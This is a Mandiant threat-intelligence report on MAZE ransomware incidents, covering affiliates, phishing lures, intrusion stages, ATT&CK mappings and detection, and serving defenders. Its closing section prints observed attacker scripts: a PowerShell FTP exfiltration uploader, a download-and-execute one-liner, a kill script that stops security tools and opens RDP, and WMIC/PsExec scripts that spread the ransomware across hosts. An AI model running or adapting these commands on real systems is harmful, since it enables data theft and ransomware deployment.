# Reference for threat actor for "TA2101, Maze Team"

**Title**: Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Mandiant

**Source**: https://www.fireeye.com/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html

## Content
Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents | Mandiant   Skip to main content Mandiant is now part of Google Cloud. Learn More.         Platform   Solutions   Intelligence   Services   Resources   Company Mandiant AdvantageExplore our multi-vendor XDR platform, delivering Mandiant products and integrating with a range of leading security operations technology.Explore the platformarrow_forward Who's targeting you   Attack Surface Management Map your external environment   Breach Analytics for Chronicle Know what we know when we know it   Security Validation Validate controls are working properly   Threat Intelligence Access latest intel from the frontlines   Digital Threat Monitoring Visibility into deep, dark, and open web   Managed Defense Managed detection and response Mandiant SolutionsSolve your toughest cyber security challenges with combinations of products and services.Featured solutionsarrow_forwardBy use casearrow_forwardBy industryarrow_forward  Featured solutions   Proactive Exposure Management New!Reduce exposures before adversaries act   Government New!Protect national services and agencies   Digital Risk ProtectionPrioritize and focus on threats that matter   RansomwareIncrease resilience against ransomware and multifaceted extortion   Know Who is Targeting YouPrioritize threats that matter most   Know What Is ExposedIdentify attack surface exposures   Know If You Are PreparedTest and measure your cyber defense program   Know If You Have Been BreachedDetect and respond to breach activity quickly and effectively   Use Case   RansomwareIncrease resilience against multifaceted extortion   Cyber Risk ManagementAdvance your business approach to cyber security   Digital Risk ProtectionPrioritize and focus on threats that matter   Industrial ControlsStrengthen OT and ICS security   Insider ThreatsUncover and manage internal vulnerabilities   Skills GapClose gaps with training and access to expertise   Private Industry   Finance New!Extend your security posture and operationalize resilience   Manufacturing New!Protect against cyber security threats to maintain business continuity   Government   Election SecurityFocus on Election Infrastructure Protection   Government  New!Protect natural services and agencies Mandiant ServicesMitigate threats, reduce risk, and get back to business with the help of leading experts.Learn morearrow_forwardView all services (47)arrow_forward Schedule a consultation   Featured categories   Cyber Security Transformation Establish and activate cyber defenses   Incident Response Tackle breaches confidently   Strategic Readiness Increase resilience to risk   Technical Assurance Test your security program   Expertise On Demand Access to Mandiant Experts   Training   Browse courses Browse on-demand and live training   Mandiant Academy Train your teams to protect effectively Cyber Threat IntelligenceMandiant specializes in cyber threat intelligence, offering products, services, and more to support our mission to defend against cyber crime. Intelligence resourcesarrow_forward  Products   Threat Intelligence Access latest intel from the frontlines   Digital Threat Monitoring visibility into deep, dark, and open web   Services   Intelligence capability development build a comprehensive threat intelligence program   Intelligence Training Develop practical application skills   Executive Briefings Get live, interactive briefings from the frontlines   Advanced Intelligence Access Hire a dedicated analyst for your needs Resource CenterGet the latest insights from cyber security experts at the frontlines of threat intelligence and incident responseM-Trends 2023 reportarrow_forwardmWISEarrow_forward View all resourcesarrow_forward   Resource types   Mandiant Blog Expert perspectives and industry news   Podcasts Interviews, hot topics, and more   Customer Stories Case studies and customer testimonials   Reports Research from the frontlines   Webinars Livestreams and pre-recorded speaker events   Insights Cyber security concepts, methods, and more   Events Upcoming conferences and collaboration   Infographics Visualization of security research and process   Datasheets Information on Mandiant offerings and more   eBooks High-impact cyber security guides   White Papers Cyber security insights and technical expertise CompanyLearn more about us and our mission to help organizations defend against cyber crime.Learn morearrow_forward Contact us   Careers Life at Mandiant and open roles   Media Center Press releases and news mentions   Partners Ecosystem and resources   Elevate Empowering women in cyber security   Mandiant Gives Back Our commitment to a better future              Sign in to Advantage  en  expand_more   English Français Deutsch Italiano 日本 한국어 EspañolGet Started        Search   Submit search form    Search   Submit search form  PlatformMandiant Advantage OverviewSecurity ValidationAttack Surface ManagementThreat IntelligenceDigital Threat MonitoringManaged DefenseSolutionsProactive Exposure ManagementGovernmentRansomwareKnow Who is Targeting YouKnow What Is ExposedKnow If You Are PreparedKnow If You Have Been BreachedCyber Risk ManagementDigital Risk ProtectionOT/ICS SecurityInsider ThreatsCyber Security Skills GapFinanceManufacturingElection SecurityIntelligenceIntelligence resourcesThreat IntelligenceDigital Threat MonitoringIntelligence Capability DevelopmentIntelligence TrainingExecutive BriefingsAdvanced Intelligence AccessServicesServices OverviewIncident ResponseStrategic ReadinessCyber Security TransformationTechnical AssuranceView all Services (48)Mandiant AcademyFind a CourseExpertise On DemandResourcesResourcesMandiant BlogsCustomer StoriesWebinarsEventsPodcastsReportsInsightsDatasheetsInfographicsWhite PaperseBooksCompanyAbout MandiantCareersMedia CenterPartnersElevateMandiant Gives BackMobile Footer SectionSee what’s new at MandiantGet startedIncident Response HelpContact SalesSupportBlogTop Incident Response Contact sales Support   BlogSupportContact usreport_problemIncident Response Assistance   Breadcrumb Home Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware Incidents   Threat Research Navigating the MAZE: Tactics, Techniques and Procedures Associated With MAZE Ransomware IncidentsJeremy Kennelly, Kimberly Goody, Joshua Shilko May 07, 202021 min read |    Last updated: Nov 24, 2022 RansomwareThreat ResearchTargeted ransomware incidents have brought a threat of disruptive and destructive attacks to organizations across industries and geographies. FireEye Mandiant Threat Intelligence has previously documented this threat in our investigations of trends across ransomware incidents, FIN6 activity, implications for OT networks, and other aspects of post-compromise ransomware deployment. Since November 2019, we’ve seen the MAZE ransomware being used in attacks that combine targeted ransomware use, public exposure of victim data, and an affiliate model.Malicious actors have been actively deploying MAZE ransomware since at least May 2019. The ransomware was initially distributed via spam emails and exploit kits before later shifting to being deployed post-compromise. Multiple actors are involved in MAZE ransomware operations, based on our observations of alleged users in underground forums and distinct tactics, techniques, and procedures across Mandiant incident response engagements. Actors behind MAZE also maintain a public-facing website where they post data stolen from victims who refuse to pay an extortion fee.The combination of these two damaging intrusion outcomes—dumping sensitive data and disrupting enterprise networks—with a criminal service makes MAZE a notable threat to many organizations. This blog post is based on information derived from numerous Mandiant incident response engagements and our own research into the MAZE ecosystem and operations.Mandiant Threat Intelligence will be available to answer questions on the MAZE ransomware threat in a May 21 webinar.VictimologyWe are aware of more than 100 alleged MAZE victims reported by various media outlets and on the MAZE website since November 2019. These organizations have been primarily based in North America, although victims spanned nearly every geographical region. Nearly every industry sector including manufacturing, legal, financial services, construction, healthcare, technology, retail, and government has been impacted demonstrating that indiscriminate nature of these operations (Figure 1).Figure 1: Geographical and industry distribution of alleged MAZE victimsMultiple Actors Involved in MAZE Ransomware Operations IdentifiedMandiant identified multiple Russian-speaking actors who claimed to use MAZE ransomware and were seeking partners to fulfill different functional roles within their teams. Additional information on these actors is available to Mandiant Intelligence subscribers. A panel used to manage victims targeted for MAZE ransomware deployment has a section for affiliate transactions. This activity is consistent with our assessment that MAZE operates under an affiliate model and is not distributed by a single group. Under this business model, ransomware developers will partner with other actors (i.e. affiliates) who are responsible for distributing the malware. In these scenarios, when a victim pays the ransom demand, the ransomware developers receive a commission. Direct affiliates of MAZE ransomware also partner with other actors who perform specific tasks for a percentage of the ransom payment. This includes partners who provide initial access to organizations and pentesters who are responsible for reconnaissance, privilege escalation and lateral movement—each of which who appear to work on a percentage-basis. Notably, in some cases, actors may be hired on a salary basis (vs commission) to perform specific tasks such as determining the victim organization and its annual revenues. This allows for specialization within the cyber criminal ecosystem, ultimately increasing efficiency, while still allowing all parties involved to profit.Figure 2: MAZE ransomware panelMAZE Initially Distributed via Exploit Kits and Spam CampaignsMAZE ransomware was initially distributed directly via exploit kits and spam campaigns through late 2019. For example, in November 2019, Mandiant observed multiple email campaigns delivering Maze ransomware primarily to individuals at organizations in Germany and the United States, although a significant number of emails were also delivered to entities in Canada, Italy, and South Korea. These emails used tax, invoice, and package delivery themes with document attachments or inline links to documents which download and execute Maze ransomware.On November 6 and 7, a Maze campaign targeting Germany delivered macro-laden documents using the subject lines “Wichtige informationen uber Steuerruckerstattung” and “1&1 Internet AG - Ihre Rechnung 19340003422 vom 07.11.19” (Figure 3). Recipients included individuals at organizations in a wide range of industries, with the Financial Services, Healthcare, and Manufacturing sectors being targeted most frequently. These emails were sent using a number of malicious domains created with the registrant address gladkoff1991@yandex.ru.Figure 3: German-language lureOn November 8, a campaign delivered Maze primarily to Financial Services and Insurance organizations located in the United states. These emails originated from a compromised or spoofed account and contained an inline link to download a Maze executable payload.On November 18 and 19, a Maze campaign targeted individuals operating in a range of industries in the United States and Canada with macro documents using phone bill and package delivery themes (Figure 4 and Figure 5). These emails used the subjects “Missed package delivery” and "Your AT&T wireless bill is ready to view" and were sent using a number of malicious domains with the registrant address abusereceive@hitler.rocks. Notably, this registrant address was also used to create multiple Italian-language domains towards the end of November 2019.Figure 4: AT&T email lureFigure 5: Canada Post email lureShift to Post-Compromise Distribution Maximizes ImpactActors using MAZE have increasingly shifted to deploying the ransomware post-compromise. This methodology provides an opportunity to infect more hosts within a victim’s environment and exfiltrate data, which is leveraged to apply additional pressure on organizations to pay extortion fees. Notably, in at least some cases, the actors behind these operations charge an additional fee, in addition to the decryption key, for the non-release of stolen data.Although the high-level intrusion scenarios preceding the distribution of MAZE ransomware are broadly similar, there have been notable variations across intrusions that suggest attribution to distinct teams. Even within these teams, the cyber criminals appear to be task-oriented meaning that one operator is not responsible for the full lifecycle. The following sections highlight the TTPs seen in a subset of incidents and serve to illustrate the divergence that may occur due to the fact that numerous, disparate actors are involved in different phases of these operations. Notably, the time between initial compromise to encryption has also been widely varied, from weeks to many months.Initial CompromiseThere are few clear patterns for intrusion vector across analyzed MAZE ransomware incidents. This is consistent with our observations of multiple actors who use MAZE soliciting partners with network access. The following are a sample of observations from several Mandiant incident response engagements:A user downloaded a malicious resume-themed Microsoft Word document that contained macros which launched an IcedID payload, which was ultimately used to execute an instance of BEACON.An actor logged into an internet-facing system via RDP. The account used to grant initial access was a generic support account. It is unclear how the actor obtained the account's password.An actor exploited a misconfiguration on an Internet-facing system. This access enabled the actor to deploy tools to pivot into the internal network.An actor logged into a Citrix web portal account with a weak password. This authenticated access enabled the actor to launch a Meterpreter payload on an internal system.Establish Foothold & Maintain PresenceThe use of legitimate credentials and broad distribution of BEACON across victim environments appear to be consistent approaches used by actors to establish their foothold in victim networks and to maintain presence as they look to meet their ultimate objective of deploying MAZE ransomware. Despite these commonplace behaviors, we have observed an actor create their own domain account to enable latter-stage operations.Across multiple incidents, threat actors deploying MAZE established a foothold in victim environments by installing BEACON payloads on many servers and workstations.Web shells were deployed to an internet-facing system. The system level access granted by these web shells was used to enable initial privilege escalation and the execution of a backdoor.Intrusion operators regularly obtained and maintained access to multiple domain and local system accounts with varying permissions that were used throughout their operations.An actor created a new domain account and added it to the domain administrators group.Escalate PrivilegesAlthough Mandiant has observed multiple cases where MAZE intrusion operators employed Mimikatz to collect credentials to enable privilege escalation, these efforts have also been bolstered in multiple cases via use of Bloodhound, and more manual searches for files containing credentials.Less than two weeks after initial access, the actor downloaded and interacted with an archive named mimi.zip, which contained files corresponding to the credential harvesting tool Mimikatz. In the following days the same mimi.zip archive was identified on two domain controllers in the impacted environment.The actor attempted to find files with the word “password” within the environment. Additionally, several archive files were also created with file names suggestive of credential harvesting activity.The actor attempted to identify hosts running the KeePass password safe software.Across multiple incidents, the Bloodhound utility was used, presumably to assess possible methods of obtaining credentials with domain administrator privileges.Actors primarily used Procdump and Mimikatz to collect credentials used to enable later stages of their intrusion. Notably, both Bloodhound and PingCastle were also used, presumably to enable attackers' efforts to understand the impacted organization's Active Directory configuration. In this case the responsible actors also attempted to exfiltrate collected credentials to multiple different cloud file storage services.ReconnaissanceMandiant has observed a broad range of approaches to network, host, data, and Active Directory reconnaissance across observed MAZE incidents. The varied tools and approaches across these incidents maybe best highlights the divergent ways in which the responsible actors interact with victim networks.In some intrusions, reconnaissance activity occurred within three days of gaining initial access to the victim network. The responsible actor executed a large number of reconnaissance scripts via Cobalt Strike to collect network, host, filesystem, and domain related information.Multiple built-in Windows commands were used to enable network, account, and host reconnaissance of the impacted environment, though the actors also supplied and used Advanced IP Scanner and Adfind to support this stage of their operations.Preliminary network reconnaissance has been conducted using a batch script named '2.bat' which contained a series of nslookup commands. The output of this script was copied into a file named '2.txt'.The actor exfiltrated reconnaissance command output data and documents related to the IT environment to an attacker-controlled FTP server via an encoded PowerShell script.Over a period of several days, an actor conducted reconnaissance activity using Bloodhound, PowerSploit/PowerView (Invoke-ShareFinder), and a reconnaissance script designed to enumerate directories across internal hosts.An actor employed the adfind tool and a batch script to collect information about their network, hosts, domain, and users. The output from this batch script (2adfind.bat) was saved into an archive named 'ad.7z' using an instance of the 7zip archiving utility named 7.exe.An actor used the tool smbtools.exe to assess whether accounts could login to systems across the environment.An actor collected directory listings from file servers across an impacted environment. Evidence of data exfiltration was observed approximately one month later, suggesting that the creation of these directory listings may have been precursor activity, providing the actors with data they may have used to identify sensitive data for future exfiltration.Lateral MovementAcross the majority of MAZE ransomware incidents lateral movement was accomplished via Cobalt Strike BEACON and using previously harvested credentials. Despite this uniformity, some alternative tools and approaches were also observed.Attackers relied heavily on Cobalt Strike BEACON to move laterally across the impacted environment, though they also tunneled RDP using the ngrok utility, and employed tscon to hijack legitimate rdp sessions to enable both lateral movement and privilege escalation.The actor moved laterally throughout some networks leveraging compromised service and user accounts obtained from the system on which they gained their initial foothold. This allowed them to obtain immediate access to additional systems. Stolen credentials were then used to move laterally across the network via RDP and to install BEACON payloads providing the actors with access to nearly one hundred hosts.An actor moved laterally using Metasploit and later deployed a Cobalt Strike payload to a system using a local administrator account.At least one actor attempted to perform lateral movement using EternalBlue in early and late 2019; however, there is no evidence that these attempts were successful.Complete MissionThere was evidence suggesting data exfiltration across most analyzed MAZE ransomware incidents. While malicious actors could monetize stolen data in various way (e.g. sale in an underground forum, fraud), actors employing MAZE are known to threaten the release of stolen data if victim organizations do not pay an extortion fee.An actor has been observed exfiltrating data to FTP servers using a base64-encoded PowerShell script designed to upload any files with .7z file extensions to a predefined FTP server using a hard-coded username and password. This script appears to be a slight variant of a script first posted to Microsoft TechNet in 2013.A different base64-encoded PowerShell command was also used to enable this functionality in a separate incident.Actors deploying MAZE ransomware have also used the utility WinSCP to exfiltrate data to an attacker-controlled FTP server.An actor has been observed employing a file replication utility and copying the stolen data to a cloud file hosting/sharing service.Prior to deploying MAZE ransomware threat actors employed the 7zip utility to archive data from across various corporate file shares. These archives were then exfiltrated to an attacker-controlled server via FTP using the WinSCP utility.In addition to data theft, actors deploy MAZE ransomware to encrypt files identified on the victim network. Notably, the aforementioned MAZE panel has an option to specify the date on which ransom demands will double, likely to create a sense of urgency to their demands.Five days after data was exfiltrated from a victim environment the actor copied a MAZE ransomware binary to 15 hosts within the victim environment and successfully executed it on a portion of these systems.Attackers employed batch scripts and a series to txt files containing host names to distribute and execute MAZE ransomware on many servers and workstations across the victim environment.An actor deployed MAZE ransomware to tens of hosts, explicitly logging into each system using a domain administrator account created earlier in the intrusion.Immediately following the exfiltration of sensitive data, the actors began deployment of MAZE ransomware to hosts across the network. In some cases, thousands of hosts were ultimately encrypted. The encryption process proceeded as follows:A batch script named start.bat was used to execute a series of secondary batch scripts with names such as xaa3x.bat or xab3x.bat.Each of these batch scripts contained a series of commands that employed the copy command, WMIC, and PsExec to copy and execute a kill script (windows.bat) and an instance of MAZE ransomware (sss.exe) on hosts across the impacted environmentNotably, forensic analysis of the impacted environment revealed MAZE deployment scripts targeting ten times as many hosts as were ultimately encrypted.ImplicationsBased on our belief that the MAZE ransomware is distributed by multiple actors, we anticipate that the TTPs used throughout incidents associated with this ransomware will continue to vary somewhat, particularly in terms of the initial intrusion vector. For more comprehensive recommendations for addressing ransomware, please refer to our Ransomware Protection and Containment Strategies blog post and the linked white paper.Mandiant Security Validation ActionsOrganizations can validate their security controls against more than 20 MAZE-specific actions with Mandiant Security Validation. Please see our Headline Release Content Updates – April 21, 2020 on the Mandiant Security Validation Customer Portal for more information.A100-877 - Active Directory - BloodHound, CollectionMethod AllA150-006 - Command and Control - BEACON, Check-inA101-030 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #1A101-031 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #2A101-032 - Command and Control - MAZE Ransomware, C2 Beacon, Variant #3A100-878 - Command and Control - MAZE Ransomware, C2 Check-inA100-887 - Command and Control - MAZE, DNS Query #1A100-888 - Command and Control - MAZE, DNS Query #2A100-889 - Command and Control - MAZE, DNS Query #3A100-890 -  Command and Control - MAZE, DNS Query #4A100-891 - Command and Control - MAZE, DNS Query #5A100-509 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Github PoCA100-339 - Exploit Kit Activity - Fallout Exploit Kit CVE-2018-8174, Landing PageA101-033 - Exploit Kit Activity - Spelevo Exploit Kit, MAZE C2A100-208 - FTP-based Exfil/Upload of PII Data (Various Compression)A104-488 - Host CLI - Collection, Exfiltration: Active Directory Reconnaissance with SharpHound, CollectionMethod AllA104-046 - Host CLI - Collection, Exfiltration: Data from Local Drive using PowerShellA104-090 - Host CLI - Collection, Impact: Creation of a Volume Shadow CopyA104-489 - Host CLI - Collection: Privilege Escalation Check with PowerUp, Invoke-AllChecksA104-037 - Host CLI - Credential Access, Discovery: File & Directory DiscoveryA104-052 - Host CLI - Credential Access: MimikatzA104-167 - Host CLI - Credential Access: Mimikatz (2.1.1)A104-490 - Host CLI - Defense Evasion, Discovery: Terminate Processes, Malware Analysis ToolsA104-491 - Host CLI - Defense Evasion, Persistence: MAZE, Create Target.lnkA104-500 - Host CLI - Discovery, Defense Evasion: Debugger DetectionA104-492 - Host CLI - Discovery, Execution: Antivirus Query with WMI, PowerShellA104-374 - Host CLI - Discovery: Enumerate Active Directory ForestsA104-493 - Host CLI - Discovery: Enumerate Network SharesA104-481 - Host CLI - Discovery: Language Query Using PowerShell, Current UserA104-482 - Host CLI - Discovery: Language Query Using reg queryA104-494 - Host CLI - Discovery: MAZE, Dropping Ransomware Note Burn DirectoryA104-495 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.html VariantA104-496 - Host CLI - Discovery: MAZE, Traversing Directories and Dropping Ransomware Note, DECRYPT-FILES.txt VariantA104-027 - Host CLI - Discovery: Process DiscoveryA104-028 - Host CLI - Discovery: Process Discovery with PowerShellA104-029 - Host CLI - Discovery: Remote System DiscoveryA104-153 - Host CLI - Discovery: Security Software Identification with TasklistA104-083 - Host CLI - Discovery: System InfoA104-483 - Host CLI - Exfiltration: PowerShell FTP UploadA104-498 - Host CLI - Impact: MAZE, Desktop Wallpaper Ransomware MessageA104-227 - Host CLI - Initial Access, Lateral Movement: Replication Through Removable MediaA100-879 - Malicious File Transfer - Adfind.exe, DownloadA150-046 - Malicious File Transfer - BEACON, DownloadA100-880 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp Executable VariantA100-881 - Malicious File Transfer - Bloodhound Ingestor Download, C Sharp PowerShell VariantA100-882 - Malicious File Transfer - Bloodhound Ingestor Download, PowerShell VariantA101-037 - Malicious File Transfer - MAZE Download, Variant #1A101-038 - Malicious File Transfer - MAZE Download, Variant #2A101-039 - Malicious File Transfer - MAZE Download, Variant #3A101-040 - Malicious File Transfer - MAZE Download, Variant #4A101-041 - Malicious File Transfer - MAZE Download, Variant #5A101-042 - Malicious File Transfer - MAZE Download, Variant #6A101-043 - Malicious File Transfer - MAZE Download, Variant #7A101-044 - Malicious File Transfer - MAZE Download, Variant #8A101-045 - Malicious File Transfer - MAZE Download, Variant #9A101-034 - Malicious File Transfer - MAZE Dropper Download, Variant #1A101-035 - Malicious File Transfer - MAZE Dropper Download, Variant #2A100-885 - Malicious File Transfer - MAZE Dropper Download, Variant #4A101-036 - Malicious File Transfer - MAZE Ransomware, Malicious Macro, PowerShell Script DownloadA100-284 - Malicious File Transfer - Mimikatz W/ Padding (1MB), DownloadA100-886 - Malicious File Transfer - Rclone.exe, DownloadA100-484 - Scanning Activity - Nmap smb-enum-shares, SMB Share EnumerationDetecting the TechniquesPlatformSignature NameMVX (covers multiple FireEye technologies)Bale DetectionFE_Ransomware_Win_MAZE_1Endpoint SecurityWMIC SHADOWCOPY DELETE (METHODOLOGY)MAZE RANSOMWARE (FAMILY)Network SecurityRansomware.Win.MAZERansomware.MazeRansomware.MazeMITRE ATT&CK MappingsMandiant currently tracks three separate clusters of activity involved in the post-compromise distribution of MAZE ransomware. Future data collection and analysis efforts may reveal additional groups involved in intrusion activity supporting MAZE operations, or may instead allow us to collapse some of these groups into larger clusters. It should also be noted that ‘initial access’ phase techniques have been included in these mappings, though in some cases this access may have been provided by a separate threat actor(s).MAZE Group 1 MITRE ATT&CK MappingATT&CK Tactic CategoryTechniquesInitial AccessT1133: External Remote ServicesT1078: Valid AccountsExecutionT1059: Command-Line InterfaceT1086: PowerShellT1064: ScriptingT1035: Service ExecutionPersistenceT1078: Valid AccountsT1050: New ServicePrivilege EscalationT1078: Valid AccountsDefense EvasionT1078: Valid AccountsT1036: MasqueradingT1027: Obfuscated Files or InformationT1064: ScriptingCredential AccessT1110: Brute ForceT1003: Credential DumpingDiscoveryT1087: Account DiscoveryT1482: Domain Trust DiscoveryT1083: File and Directory DiscoveryT1135: Network Share DiscoveryT1069: Permission Groups DiscoveryT1018: Remote System DiscoveryT1016: System Network Configuration DiscoveryLateral MovementT1076: Remote Desktop ProtocolT1105: Remote File CopyCollectionT1005: Data from Local SystemCommand and ControlT1043: Commonly Used PortT1105: Remote File CopyT1071: Standard Application Layer ProtocolExfiltrationT1002: Data CompressedT1048: Exfiltration Over Alternative ProtocolImpactT1486: Data Encrypted for ImpactT1489: Service StopMAZE Group 2 MITRE ATT&CK MappingATT&CK Tactic CategoryTechniquesInitial AccessT1193: Spearphishing AttachmentExecutionT1059: Command-Line InterfaceT1086: PowerShellT1085: Rundll32T1064: ScriptingT1204: User ExecutionT1028: Windows Remote ManagementPersistenceT1078: Valid AccountsT1050: New ServiceT1136: Create AccountPrivilege EscalationT1078: Valid AccountsT1050: New ServiceDefense EvasionT1078: Valid AccountsT1140: Deobfuscate/Decode Files or InformationT1107: File DeletionT1036: MasqueradingCredential AccessT1003: Credential DumpingT1081: Credentials in FilesT1171: LLMNR/NBT-NS PoisoningDiscoveryT1087: Account DiscoveryT1482: Domain Trust DiscoveryT1083: File and Directory DiscoveryT1135: Network Share DiscoveryT1069: Permission Groups DiscoveryT1018: Remote System DiscoveryT1033: System Owner/User DiscoveryLateral MovementT1076: Remote Desktop ProtocolT1028: Windows Remote ManagementCollectionT1074: Data StagedT1005: Data from Local SystemT1039: Data from Network Shared DriveCommand and ControlT1043: Commonly Used PortT1219: Remote Access ToolsT1105: Remote File CopyT1071: Standard Application Layer ProtocolT1032: Standard Cryptographic ProtocolExfiltrationT1020: Automated ExfiltrationT1002: Data CompressedT1048: Exfiltration Over Alternative ProtocolImpactT1486: Data Encrypted for ImpactMAZE Group 3 MITRE ATT&CK Mapping (FIN6)ATT&CK Tactic CategoryTechniquesInitial AccessT1133: External Remote ServicesT1078: Valid AccountsExecutionT1059: Command-Line InterfaceT1086: PowerShellT1064: ScriptingT1035: Service ExecutionPersistenceT1078: Valid AccountsT1031: Modify Existing ServicePrivilege EscalationT1055: Process InjectionT1078: Valid AccountsDefense EvasionT1055: Process InjectionT1078: Valid AccountsT1116: Code SigningT1089: Disabling Security ToolsT1202: Indirect Command ExecutionT1112: Modify RegistryT1027: Obfuscated Files or InformationT1108: Redundant AccessT1064: ScriptingCredential AccessT1003: Credential DumpingDiscoveryT1087: Account DiscoveryT1482: Domain Trust DiscoveryT1083: File and Directory DiscoveryT1069: Permission Groups DiscoveryT1018: Remote System DiscoveryLateral MovementT1097: Pass the TicketT1076: Remote Desktop ProtocolT1105: Remote File CopyT1077: Windows Admin SharesCollectionT1074: Data StagedT1039: Data from Network Shared DriveCommand and ControlT1043: Commonly Used PortT1219: Remote Access ToolsT1105: Remote File CopyT1071: Standard Application Layer ProtocolT1032: Standard Cryptographic ProtocolExfiltrationT1002: Data CompressedImpactT1486: Data Encrypted for ImpactT1490: Inhibit System RecoveryT1489: Service StopExample Commands Observed in MAZE Ransomware Incidentsfunction Enum-UsersFolders($PathEnum){    $foldersArr = 'Desktop','Downloads','Documents','AppData/Roaming','AppData/Local'    Get-ChildItem -Path $PathEnum'/c$' -ErrorAction SilentlyContinue    Get-ChildItem -Path $PathEnum'/c$/Program Files' -ErrorAction SilentlyContinue    Get-ChildItem -Path $PathEnum'/c$/Program Files (x86)' -ErrorAction SilentlyContinue    foreach($Directory in Get-ChildItem -Path $PathEnum'/c$/Users' -ErrorAction SilentlyContinue) {        foreach($SeachDir in $foldersArr) {            Get-ChildItem -Path $PathEnum'/c$/Users/'$Directory'/'$SeachDir -ErrorAction SilentlyContinue        }    }}PowerShell reconnaissance script used to enumerate directories$Dir="C:/Windows/Temp/"#ftp server$ftp = "ftp://<IP Address>/incoming/"$user = "<username>"$pass = "<password>"$webclient = New-Object System.Net.WebClient$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)#list every sql server trace fileforeach($item in (dir $Dir "*.7z")){   "Uploading $item..."   $uri = New-Object System.Uri($ftp+$item.Name)   $webclient.UploadFile($uri, $item.FullName)}Decoded FTP upload PowerShell scriptpowershell -nop -exec bypass IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:43984/'); Add-FtpFile -ftpFilePath "ftp://<IP  Address>/cobalt_uploads/<file name>" -localFile "<local file path>\ <file name> " -userName "<username>" -password "<password>"Decoded FTP upload PowerShell script[…]echo 7echo 7taskkill /im csrss_tc.exe /ftaskkill /im kwsprod.exe /ftaskkill /im avkwctl.exe /ftaskkill /im rnav.exe /ftaskkill /im crssvc.exe /fsc config CSAuth start= disabledtaskkill /im vsserv.exe /ftaskkill /im ppmcativedetection.exe /f[…]taskkill /im sahookmain.exe /ftaskkill /im mcinfo.exe /freg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /fnetsh advfirewall firewall set rule group="remote desktop" new enable=Yec:\windows\temp\sss.exeExcerpt from windows.bat kill scriptstart copy sss.exe \\<internal IP>\c$\windows\temp\start copy sss.exe \\<internal IP>\c$\windows\temp\start copy windows.bat \\<internal IP>\c$\windows\temp\start copy windows.bat \\<internal IP>\c$\windows\temp\start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "c:\windows\temp\sss.exe"start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "c:\windows\temp\sss.exe"start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c c:\windows\temp\windows.bat"start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c c:\windows\temp\windows.bat"start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c copy \\<internal IP>\c$\windows\temp\sss.exe c:\windows\temp\"start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c copy \\<internal IP>\c$\windows\temp\sss.exe c:\windows\temp\"start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c copy \\<internal IP>\c$\windows\temp\windows.bat c:\windows\temp\"start wmic /node:"<internal IP>" /user:"<DOMAIN\adminaccount>" /password:"<password>" process call create "cmd.exe /c copy \\<internal IP>\c$\windows\temp\windows.bat c:\windows\temp\"start psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p "<password>" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exestart psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p "<password>" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\sss.exestart psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p "<password>" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.batstart psexec.exe \\<internal IP> -u <DOMAIN\adminaccount> -p "<password>" -d -h -r rtrsd -s -accepteula -nobanner c:\windows\temp\windows.batExample commands from MAZE distribution scripts@echo offdel done.txtdel offline.txtrem Loop thru list of computer names in file specified on command-linefor /f %%i in (%1) do call :check_machine %%igoto end:check_machinerem Check to see if machine is up.ping -n 1 %1|Find "TTL=" >NUL 2>NULif errorlevel 1 goto downecho %1START cmd /c "copy [Location of MAZE binary] \\%1\c$\windows\temp && exit"timeout 1 > NULecho %1 >> done.txtrem wmic /node:"%1" process call create "regsvr32.exe /i C:\windows\temp\[MAZE binary name]" >> done.txtSTART "" cmd /c "wmic /node:"%1" process call create "regsvr32.exe /i C:\windows\temp\[MAZE binary name]" && exit"goto end:down  rem Report machine down  echo %1 >> offline.txt:endExample MAZE distribution scriptIndicators of CompromiseMaze 